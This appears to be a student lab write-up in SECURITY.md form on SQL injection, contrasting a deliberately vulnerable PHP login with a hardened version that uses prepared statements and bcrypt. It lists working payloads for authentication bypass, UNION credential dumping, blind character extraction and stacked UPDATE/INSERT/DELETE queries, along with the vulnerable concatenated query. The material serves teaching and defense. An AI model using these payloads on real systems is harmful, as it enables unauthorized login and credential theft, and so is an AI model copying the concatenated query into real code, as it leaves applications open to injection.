# SECURITY.md — SQL Injection: Attacks and Defenses

---

## 1. How SQL Injection Works

SQL Injection occurs when **user input is directly embedded into SQL queries**, allowing attackers to manipulate query logic.

Example vulnerable code:

```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Here, the database cannot differentiate between:

* Developer’s SQL logic
* User-provided input

---

### 🔥 Example Injection

Input:

```text
admin'-- 
```

Query becomes:

```sql
SELECT * FROM users WHERE username='admin'-- ' AND password=''
```

👉 `--` comments out the password check
👉 Login succeeds without password

---

## ⚠️ Role of SQL Comments

Attackers use comments to ignore remaining query:

| Symbol  | Meaning                           |
| ------- | --------------------------------- |
| `-- `   | Single-line comment (needs space) |
| `#`     | MySQL comment                     |
| `/* */` | Block comment                     |

Example:

```sql
' OR 1=1 #
```

👉 Everything after `#` is ignored

---

## 2. Types of Attacks Performed

---

### 🔓 Attack 1: Authentication Bypass

**Input:**

```
admin'-- 
```

**Query:**

```sql
SELECT * FROM users WHERE username='admin'-- ' AND password=''
```

**Impact:**

* Password verification removed
* Unauthorized login

---

### 📊 Attack 2: Union-Based Injection

**Input:**

```
' UNION SELECT username, password FROM users-- 
```

**Query:**

```sql
SELECT * FROM users WHERE username='' 
UNION SELECT username, password FROM users--
```

**Impact:**

* Entire database dumped
* All credentials exposed

---

### 🧠 Attack 3: Blind SQL Injection

#### Boolean-based:

```
admin' AND 1=1--   → TRUE
admin' AND 1=2--   → FALSE
```

👉 Application response reveals truth value

---

#### Password Extraction:

```sql
admin' AND SUBSTRING(password,1,1)='a'--
```

👉 Character-by-character extraction

---

### 💣 Attack 4: Database Modification (Stacked Queries)

#### UPDATE:

```
admin'; UPDATE users SET password='hacked' WHERE username='admin'-- 
```

#### INSERT:

```
admin'; INSERT INTO users VALUES ('attacker','1234')-- 
```

#### DELETE:

```
admin'; DELETE FROM users WHERE username='attacker'-- 
```

---

## 3. How Attacks Modified the Database

### Before:

```
user1 | pass1
admin | admin123
```

---

### After UPDATE:

```
user1 | pass1
admin | hacked
```

---

### After INSERT:

```
user1 | pass1
admin | hacked
attacker | 1234
```

---

### After DELETE:

```
user1 | pass1
admin | hacked
```

---

## 4. Secure Application (lab5_hashed)

The secure app uses a **separate database:**

```sql
lab5_hashed
```

---

### 🔐 Key Security Features

---

### ✅ 1. Prepared Statements

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=?");
$stmt->execute([$username]);
```

👉 Input is treated as **data only**, not SQL

---

### ✅ 2. Password Hashing

Passwords stored as:

```text
$2y$10$abc... (bcrypt hash)
```

Verification:

```php
password_verify($password, $hash);
```

👉 Even if DB is leaked:

* Passwords cannot be reversed

---

### ✅ 3. Input Validation

```php
/^[a-zA-Z0-9_]+$/
```

👉 Blocks:

* `'`, `--`, `#`, `;`, `/* */`

---

### ✅ 4. No SQL Error Exposure

* No database structure leakage
* Only generic error messages

---

## 5. Why Attacks Fail on Secure App

| Attack               | Reason for Failure       |
| -------------------- | ------------------------ |
| `' OR 1=1 --`        | Treated as plain string  |
| `admin'--`           | No query breaking        |
| `#`, `/* */`         | No SQL interpretation    |
| UNION                | Not executed             |
| Blind SQL            | No behavioral difference |
| UPDATE/INSERT/DELETE | Not executed             |

---

### 🧠 Core Reason

👉 Query is precompiled:

```sql
SELECT * FROM users WHERE username = ?
```

👉 User input is **never executed as SQL**

---

## 6. Key Security Principles

---

### ❌ Vulnerable System

* String concatenation
* Direct execution of user input
* Plaintext passwords
* SQL errors exposed

---

### ✅ Secure System

* Prepared statements
* Hashed passwords
* Input validation
* No error leakage

---

## 🎯 Final Insight

👉 Root cause of SQL Injection:

> Mixing user input with SQL code

👉 Final solution:

> Separate code and data using prepared statements

---

## 🧠 Viva Ready Points

* SQL Injection manipulates query structure
* Comments (`--`, `#`, `/* */`) bypass logic
* Blind SQL uses TRUE/FALSE responses
* UNION extracts full database
* Stacked queries modify database
* Prepared statements prevent all injection
* Hashing protects passwords even after data leak

---

## ✅ Conclusion

This lab demonstrates the **complete lifecycle**:

```text
Vulnerable → Exploited → Data extracted → Database modified → Secured
```

All attacks succeed in `lab5` but fail completely in `lab5_hashed`, proving the effectiveness of secure coding practices.

---
